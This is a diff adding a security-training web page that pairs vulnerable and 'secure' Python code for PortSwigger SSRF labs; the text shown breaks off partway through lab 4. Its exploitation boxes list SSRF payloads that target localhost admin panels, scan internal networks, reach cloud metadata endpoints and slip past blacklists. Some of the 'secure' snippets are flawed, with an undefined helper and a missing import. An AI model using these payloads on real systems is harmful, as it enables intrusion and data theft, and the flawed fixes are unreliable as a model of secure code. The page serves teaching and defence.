@@ -1,0 +1,1418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Code Review Playground | Security Learning</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <style>
+        :root {
+            --bg-primary: #0a0e17;
+            --bg-secondary: #131a2b;
+            --bg-tertiary: #1a2540;
+            --accent-red: #ff4757;
+            --accent-green: #2ed573;
+            --accent-blue: #3742fa;
+            --accent-yellow: #ffa502;
+            --accent-purple: #8b5cf6;
+            --accent-cyan: #00d4ff;
+            --accent-pink: #ff6b9d;
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --border-color: #2a3a5c;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
+            padding: 20px 40px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+            background: linear-gradient(135deg, var(--accent-pink), var(--accent-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header-badge { display: flex; gap: 10px; }
+
+        .badge {
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .badge-lab {
+            background: rgba(255, 107, 157, 0.2);
+            color: var(--accent-pink);
+            border: 1px solid var(--accent-pink);
+        }
+
+        .badge-count {
+            background: rgba(139, 92, 246, 0.2);
+            color: var(--accent-purple);
+            border: 1px solid var(--accent-purple);
+        }
+
+        .main-container { display: flex; height: calc(100vh - 80px); }
+
+        .sidebar {
+            width: 340px;
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border-color);
+            overflow-y: auto;
+            padding: 20px 0;
+        }
+
+        .sidebar-section { margin-bottom: 25px; }
+
+        .sidebar-title {
+            padding: 10px 20px;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .lab-item {
+            padding: 12px 20px;
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .lab-item:hover {
+            background: var(--bg-tertiary);
+            border-left-color: var(--accent-pink);
+        }
+
+        .lab-item.active {
+            background: var(--bg-tertiary);
+            border-left-color: var(--accent-purple);
+        }
+
+        .lab-item i { font-size: 1.1rem; width: 24px; text-align: center; }
+        .lab-item .lab-name { flex: 1; font-size: 0.85rem; }
+
+        .lab-item .difficulty {
+            font-size: 0.65rem;
+            padding: 3px 8px;
+            border-radius: 10px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .difficulty.apprentice { background: rgba(46, 213, 115, 0.2); color: var(--accent-green); }
+        .difficulty.practitioner { background: rgba(255, 165, 2, 0.2); color: var(--accent-yellow); }
+        .difficulty.expert { background: rgba(255, 71, 87, 0.2); color: var(--accent-red); }
+
+        .content-area { flex: 1; overflow-y: auto; padding: 30px 40px; }
+
+        .lab-header { margin-bottom: 30px; }
+        .lab-header h2 { font-size: 1.6rem; margin-bottom: 10px; color: var(--text-primary); }
+
+        .lab-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 15px; }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .meta-item i { color: var(--accent-pink); }
+
+        .lab-description { color: var(--text-secondary); line-height: 1.7; font-size: 0.95rem; }
+
+        .vuln-section {
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border-color);
+        }
+
+        .vuln-section h3 {
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .vuln-section h3 i { color: var(--accent-red); }
+
+        .vuln-list { list-style: none; padding-left: 0; }
+
+        .vuln-list li {
+            padding: 8px 0;
+            padding-left: 25px;
+            position: relative;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .vuln-list li::before {
+            content: '>';
+            position: absolute;
+            left: 0;
+            color: var(--accent-pink);
+        }
+
+        .code-review-section { margin-bottom: 30px; }
+
+        .code-tabs { display: flex; gap: 10px; margin-bottom: 15px; }
+
+        .code-tab {
+            padding: 10px 20px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .code-tab:hover { border-color: var(--accent-pink); }
+
+        .code-tab.active {
+            background: var(--accent-red);
+            border-color: var(--accent-red);
+            color: white;
+        }
+
+        .code-tab.secure.active {
+            background: var(--accent-green);
+            border-color: var(--accent-green);
+        }
+
+        .code-container {
+            position: relative;
+            background: #1e1e1e;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            margin-bottom: 15px;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            background: var(--bg-tertiary);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .code-filename {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .code-filename i { color: var(--accent-yellow); }
+
+        .code-block {
+            padding: 20px;
+            overflow-x: auto;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .code-block pre {
+            margin: 0;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .vuln-line {
+            background: rgba(255, 71, 87, 0.15);
+            display: block;
+            margin: 0 -20px;
+            padding: 0 20px;
+            border-left: 3px solid var(--accent-red);
+        }
+
+        .secure-line {
+            background: rgba(46, 213, 115, 0.15);
+            display: block;
+            margin: 0 -20px;
+            padding: 0 20px;
+            border-left: 3px solid var(--accent-green);
+        }
+
+        .payload-section {
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border-color);
+        }
+
+        .payload-section h3 {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--accent-green);
+        }
+
+        .payload-box {
+            background: #1e1e1e;
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border-color);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-yellow);
+            overflow-x: auto;
+            position: relative;
+            white-space: pre;
+        }
+
+        .payload-box .payload-label {
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            background: var(--bg-secondary);
+            padding: 2px 10px;
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            border-radius: 4px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .hidden { display: none !important; }
+
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent-pink); }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+
+        .back-link:hover { color: var(--accent-pink); }
+
+        .info-box {
+            background: rgba(139, 92, 246, 0.1);
+            border: 1px solid var(--accent-purple);
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            color: var(--accent-purple);
+        }
+
+        .info-box i { margin-right: 10px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <a href="../tools.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Tools</a>
+            <h1><i class="fas fa-server"></i> SSRF Code Review Playground</h1>
+        </div>
+        <div class="header-badge">
+            <span class="badge badge-lab">PortSwigger Labs</span>
+            <span class="badge badge-count">7 Labs</span>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="sidebar">
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-crosshairs"></i> Basic SSRF</div>
+                <div class="lab-item active" data-lab="lab1-local-server">
+                    <i class="fas fa-home" style="color: var(--accent-red);"></i>
+                    <span class="lab-name">SSRF Against Local Server</span>
+                    <span class="difficulty apprentice">Easy</span>
+                </div>
+                <div class="lab-item" data-lab="lab2-backend-system">
+                    <i class="fas fa-network-wired" style="color: var(--accent-yellow);"></i>
+                    <span class="lab-name">SSRF Against Back-end System</span>
+                    <span class="difficulty apprentice">Easy</span>
+                </div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-filter"></i> Filter Bypass</div>
+                <div class="lab-item" data-lab="lab3-blacklist-bypass">
+                    <i class="fas fa-ban" style="color: var(--accent-purple);"></i>
+                    <span class="lab-name">Blacklist-Based Filter Bypass</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab4-whitelist-bypass">
+                    <i class="fas fa-check-circle" style="color: var(--accent-cyan);"></i>
+                    <span class="lab-name">Whitelist-Based Filter Bypass</span>
+                    <span class="difficulty expert">Hard</span>
+                </div>
+                <div class="lab-item" data-lab="lab5-open-redirect">
+                    <i class="fas fa-external-link-alt" style="color: var(--accent-green);"></i>
+                    <span class="lab-name">Filter Bypass via Open Redirect</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-eye-slash"></i> Blind SSRF</div>
+                <div class="lab-item" data-lab="lab6-blind-oob">
+                    <i class="fas fa-satellite-dish" style="color: var(--accent-pink);"></i>
+                    <span class="lab-name">Blind SSRF with Out-of-Band</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab7-shellshock">
+                    <i class="fas fa-bomb" style="color: var(--accent-red);"></i>
+                    <span class="lab-name">Blind SSRF with Shellshock</span>
+                    <span class="difficulty expert">Hard</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="content-area">
+            <!-- Lab 1: SSRF Against Local Server -->
+            <div id="lab1-local-server" class="lab-content">
+                <div class="lab-header">
+                    <h2><i class="fas fa-home"></i> Lab 1: Basic SSRF Against the Local Server</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Apprentice</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application fetches data from a URL specified by the user. An attacker can manipulate this to
+                        make the server request internal resources like localhost admin panels that are otherwise inaccessible.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>SSRF Basics:</strong> Server-Side Request Forgery makes the server perform requests on behalf of
+                    the attacker, often accessing internal services, cloud metadata APIs, or localhost-only admin interfaces.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>User-controlled URL passed to server-side HTTP request</li>
+                        <li>No validation of target host/protocol</li>
+                        <li>Server can access localhost/internal resources</li>
+                        <li>Admin panel only accessible from localhost is exposed</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab1"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab1"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab1-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>stock_checker.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+<span class="vuln-line">    # ❌ User-controlled URL with no validation!</span>
+<span class="vuln-line">    stock_url = request.form.get('stockApi')</span>
+
+<span class="vuln-line">    # ❌ Server makes request to arbitrary URL</span>
+<span class="vuln-line">    response = requests.get(stock_url)</span>
+
+    return response.text
+
+# Normal request:
+# stockApi=http://stock.internal.com/api/stock?productId=1
+
+# Attack request:
+# stockApi=http://localhost/admin
+# stockApi=http://127.0.0.1/admin/delete?user=carlos
+
+# The server fetches localhost:
+# - Admin panel thinks request is from localhost
+# - Access controls bypassed!
+# - Attacker can delete users, view secrets, etc.</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab1-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>stock_checker.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+from urllib.parse import urlparse
+
+<span class="secure-line"># ✅ Whitelist of allowed hosts</span>
+<span class="secure-line">ALLOWED_HOSTS = {'stock.internal.com', 'inventory.internal.com'}</span>
+
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+    stock_url = request.form.get('stockApi')
+
+<span class="secure-line">    # ✅ Parse and validate URL</span>
+<span class="secure-line">    try:</span>
+<span class="secure-line">        parsed = urlparse(stock_url)</span>
+<span class="secure-line">    except:</span>
+<span class="secure-line">        abort(400, "Invalid URL")</span>
+
+<span class="secure-line">    # ✅ Check protocol (only HTTPS)</span>
+<span class="secure-line">    if parsed.scheme != 'https':</span>
+<span class="secure-line">        abort(400, "Only HTTPS allowed")</span>
+
+<span class="secure-line">    # ✅ Check host against whitelist</span>
+<span class="secure-line">    if parsed.hostname not in ALLOWED_HOSTS:</span>
+<span class="secure-line">        abort(403, "Host not allowed")</span>
+
+<span class="secure-line">    # ✅ Block private IP ranges</span>
+<span class="secure-line">    if is_private_ip(parsed.hostname):</span>
+<span class="secure-line">        abort(403, "Private IPs not allowed")</span>
+
+    response = requests.get(stock_url, timeout=5)
+    return response.text</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">SSRF payloads to access localhost admin</span>
+# Basic localhost access
+stockApi=http://localhost/admin
+stockApi=http://127.0.0.1/admin
+stockApi=http://127.1/admin
+
+# Delete user via admin panel
+stockApi=http://localhost/admin/delete?username=carlos
+
+# Alternative localhost representations
+stockApi=http://[::1]/admin           # IPv6 localhost
+stockApi=http://0.0.0.0/admin
+stockApi=http://0/admin
+stockApi=http://127.0.0.1:80/admin
+stockApi=http://127.0.0.1:8080/admin
+
+# Using decimal IP (2130706433 = 127.0.0.1)
+stockApi=http://2130706433/admin
+
+# Using octal IP
+stockApi=http://0177.0.0.1/admin
+                    </div>
+                </div>
+            </div>
+
+            <!-- Placeholders for other labs -->
+            <!-- Lab 2: SSRF Against Back-end System -->
+            <div id="lab2-backend-system" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-network-wired"></i> Lab 2: Basic SSRF Against Another Back-end System</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Apprentice</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application can be exploited to access internal back-end systems on the private network.
+                        By scanning internal IP ranges, attackers can discover and access hidden admin interfaces.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>Internal Network Scanning:</strong> SSRF can be used to scan internal networks (192.168.x.x, 10.x.x.x, 172.16.x.x)
+                    to discover services not exposed to the internet.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Server can reach internal network resources</li>
+                        <li>No restrictions on private IP addresses</li>
+                        <li>Attacker scans 192.168.0.x range to find admin</li>
+                        <li>Internal admin panel accessible without authentication</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab2"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab2"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab2-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>stock_checker.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+<span class="vuln-line">    # ❌ No validation of internal IP ranges</span>
+    stock_url = request.form.get('stockApi')
+
+<span class="vuln-line">    # ❌ Server can access internal network</span>
+<span class="vuln-line">    response = requests.get(stock_url, timeout=5)</span>
+
+    return response.text
+
+# Network topology:
+# Internet <-> Web Server (10.0.0.1) <-> Internal Network (192.168.0.x)
+#
+# Attacker uses web server as proxy to internal network:
+# stockApi=http://192.168.0.1:8080/admin
+# stockApi=http://192.168.0.2:8080/admin
+# ... scan until finding the admin interface
+
+# Internal admin has no auth (trusts internal network)
+# Attacker gains full admin access via SSRF!</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab2-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>stock_checker.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+import ipaddress
+import socket
+
+<span class="secure-line"># ✅ Block private and reserved IP ranges</span>
+<span class="secure-line">BLOCKED_NETWORKS = [</span>
+<span class="secure-line">    ipaddress.ip_network('10.0.0.0/8'),</span>
+<span class="secure-line">    ipaddress.ip_network('172.16.0.0/12'),</span>
+<span class="secure-line">    ipaddress.ip_network('192.168.0.0/16'),</span>
+<span class="secure-line">    ipaddress.ip_network('127.0.0.0/8'),</span>
+<span class="secure-line">    ipaddress.ip_network('169.254.0.0/16'),  # Link-local</span>
+<span class="secure-line">]</span>
+
+<span class="secure-line">def is_safe_url(url):</span>
+<span class="secure-line">    parsed = urlparse(url)</span>
+<span class="secure-line">    hostname = parsed.hostname</span>
+<span class="secure-line"></span>
+<span class="secure-line">    # Resolve DNS to check actual IP</span>
+<span class="secure-line">    try:</span>
+<span class="secure-line">        ip = ipaddress.ip_address(socket.gethostbyname(hostname))</span>
+<span class="secure-line">    except:</span>
+<span class="secure-line">        return False</span>
+<span class="secure-line"></span>
+<span class="secure-line">    # Check against blocked networks</span>
+<span class="secure-line">    for network in BLOCKED_NETWORKS:</span>
+<span class="secure-line">        if ip in network:</span>
+<span class="secure-line">            return False</span>
+<span class="secure-line">    return True</span>
+
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+    stock_url = request.form.get('stockApi')
+
+<span class="secure-line">    if not is_safe_url(stock_url):</span>
+<span class="secure-line">        abort(403, "Access to internal networks blocked")</span>
+
+    response = requests.get(stock_url, timeout=5)
+    return response.text</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Scanning internal network via SSRF</span>
+# Scan internal network for admin panel
+# Use Burp Intruder to scan IP range
+
+stockApi=http://192.168.0.1:8080/admin
+stockApi=http://192.168.0.2:8080/admin
+stockApi=http://192.168.0.3:8080/admin
+...
+stockApi=http://192.168.0.255:8080/admin
+
+# Common internal ports to check
+:80, :8080, :8443, :443, :8000, :3000, :5000
+
+# Once admin found (e.g., 192.168.0.45):
+stockApi=http://192.168.0.45:8080/admin/delete?username=carlos
+
+# Cloud metadata endpoints (AWS, GCP, Azure)
+stockApi=http://169.254.169.254/latest/meta-data/
+stockApi=http://metadata.google.internal/computeMetadata/v1/
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 3: Blacklist-Based Filter Bypass -->
+            <div id="lab3-blacklist-bypass" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-ban"></i> Lab 3: SSRF with Blacklist-Based Input Filter</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application blocks requests containing "127.0.0.1" and "localhost". However, blacklist filters
+                        can be bypassed using alternative IP representations, URL encoding, or DNS tricks.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-exclamation-triangle" style="color: var(--accent-yellow);"></i>
+                    <strong>Blacklists Are Weak:</strong> There are countless ways to represent the same IP address.
+                    Blacklists will always miss some bypass technique. Use whitelists instead.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Blacklist blocks "127.0.0.1" and "localhost" strings</li>
+                        <li>Alternative IP representations bypass the filter</li>
+                        <li>URL encoding, decimal IPs, IPv6 all work</li>
+                        <li>Case variations and obfuscation bypass checks</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab3"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab3"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab3-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>stock_checker.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+
+<span class="vuln-line"># ❌ Blacklist approach - easily bypassed!</span>
+<span class="vuln-line">BLOCKED_HOSTS = ['127.0.0.1', 'localhost', '127.1']</span>
+<span class="vuln-line">BLOCKED_PATHS = ['admin', '/admin']</span>
+
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+    stock_url = request.form.get('stockApi')
+
+<span class="vuln-line">    # ❌ Simple string matching - trivially bypassed</span>
+<span class="vuln-line">    for blocked in BLOCKED_HOSTS:</span>
+<span class="vuln-line">        if blocked in stock_url.lower():</span>
+<span class="vuln-line">            abort(403, "Blocked host")</span>
+
+<span class="vuln-line">    for blocked in BLOCKED_PATHS:</span>
+<span class="vuln-line">        if blocked in stock_url.lower():</span>
+<span class="vuln-line">            abort(403, "Blocked path")</span>
+
+    response = requests.get(stock_url)
+    return response.text
+
+# Bypasses:
+# - 127.0.0.1 blocked but 127.0.0.1. works (trailing dot)
+# - localhost blocked but LocalHost works (case)
+# - admin blocked but /Admin or %61dmin works</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab3-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>stock_checker.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+import ipaddress
+import socket
+from urllib.parse import urlparse, unquote
+
+<span class="secure-line"># ✅ Whitelist of allowed hosts - not blacklist!</span>
+<span class="secure-line">ALLOWED_HOSTS = {'stock.example.com', 'inventory.example.com'}</span>
+
+<span class="secure-line">def normalize_and_validate(url):</span>
+<span class="secure-line">    # Decode URL multiple times to prevent double-encoding bypass</span>
+<span class="secure-line">    decoded = url</span>
+<span class="secure-line">    for _ in range(3):</span>
+<span class="secure-line">        decoded = unquote(decoded)</span>
+<span class="secure-line"></span>
+<span class="secure-line">    parsed = urlparse(decoded)</span>
+<span class="secure-line">    hostname = parsed.hostname.lower().rstrip('.')</span>
+<span class="secure-line"></span>
+<span class="secure-line">    # ✅ Resolve DNS and check actual IP</span>
+<span class="secure-line">    try:</span>
+<span class="secure-line">        ip = ipaddress.ip_address(socket.gethostbyname(hostname))</span>
+<span class="secure-line">        if ip.is_private or ip.is_loopback:</span>
+<span class="secure-line">            return False</span>
+<span class="secure-line">    except:</span>
+<span class="secure-line">        pass</span>
+<span class="secure-line"></span>
+<span class="secure-line">    # ✅ Whitelist check</span>
+<span class="secure-line">    return hostname in ALLOWED_HOSTS</span>
+
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+    stock_url = request.form.get('stockApi')
+
+<span class="secure-line">    if not normalize_and_validate(stock_url):</span>
+<span class="secure-line">        abort(403, "Host not in whitelist")</span>
+
+    response = requests.get(stock_url, timeout=5)
+    return response.text</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Blacklist bypass techniques</span>
+# Alternative localhost representations
+http://127.1/admin                    # Shortened
+http://127.0.0.1./admin               # Trailing dot
+http://127.000.000.001/admin          # Padded zeros
+http://2130706433/admin               # Decimal IP
+http://0x7f000001/admin               # Hex IP
+http://017700000001/admin             # Octal IP
+http://[::1]/admin                    # IPv6 localhost
+http://[::ffff:127.0.0.1]/admin       # IPv6 mapped
+http://0/admin                        # 0.0.0.0 = localhost
+
+# URL encoding bypasses for "admin"
+http://127.1/%61dmin                  # 'a' encoded
+http://127.1/%41dmin                  # 'A' encoded
+http://127.1/admin%00.html            # Null byte
+http://127.1/%2561dmin                # Double encoded
+
+# Case variations
+http://127.1/Admin
+http://127.1/ADMIN
+http://127.1/aDmIn
+
+# DNS rebinding (attacker controls DNS)
+http://attacker-domain.com/admin      # DNS points to 127.0.0.1
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 4: Whitelist-Based Filter Bypass -->
+            <div id="lab4-whitelist-bypass" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-check-circle"></i> Lab 4: SSRF with Whitelist-Based Input Filter</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Expert</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application uses whitelist validation but has flawed URL parsing. By exploiting URL parsing
+                        inconsistencies with embedded credentials, fragments, or special characters, the filter can be bypassed.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-exclamation-triangle" style="color: var(--accent-red);"></i>
+                    <strong>URL Parsing Inconsistencies:</strong> Different URL parsers interpret URLs differently.
+                    What the validator sees vs what the HTTP library requests may differ significantly.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Whitelist checks for "stock.weliketoshop.net" in URL</li>
+                        <li>URL parsing doesn't properly handle edge cases</li>
+                        <li>Credentials in URL: user@host bypass host check</li>
+                        <li>URL fragments (#) and special chars confuse parser</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab4"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab4"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab4-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>stock_checker.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+from urllib.parse import urlparse
+
+<span class="vuln-line">ALLOWED_HOST = 'stock.weliketoshop.net'</span>
+
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+    stock_url = request.form.get('stockApi')
+
+<span class="vuln-line">    # ❌ Flawed whitelist check</span>
+<span class="vuln-line">    parsed = urlparse(stock_url)</span>
+
+<span class="vuln-line">    # ❌ Only checks if allowed host appears in netloc</span>
+<span class="vuln-line">    if ALLOWED_HOST not in parsed.netloc:</span>
+<span class="vuln-line">        abort(403, "Host not allowed")</span>
+
+    # The actual HTTP library may interpret URL differently!
+    response = requests.get(stock_url)
+    return response.text
+
+# Bypass examples:
+# http://localhost#@stock.weliketoshop.net/
+#   Parser sees: host=localhost, fragment=@stock...
+#   Check passes because "stock..." in netloc? No!
+#
+# http://localhost:80%2523@stock.weliketoshop.net/
+#   Double URL encoding tricks the parser</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab4-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>stock_checker.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+from urllib.parse import urlparse, unquote
+import re
+
+<span class="secure-line">ALLOWED_HOSTS = {'stock.weliketoshop.net'}</span>
+
+<span class="secure-line">def strict_url_validate(url):</span>
+<span class="secure-line">    # Decode URL completely first</span>
+<span class="secure-line">    decoded = url</span>
+<span class="secure-line">    prev = None</span>
+<span class="secure-line">    while prev != decoded:</span>
+<span class="secure-line">        prev = decoded</span>
+<span class="secure-line">        decoded = unquote(decoded)</span>
+<span class="secure-line"></span>
+<span class="secure-line">    # Reject URLs with credentials (@)</span>
+<span class="secure-line">    if '@' in decoded:</span>
+<span class="secure-line">        return False</span>
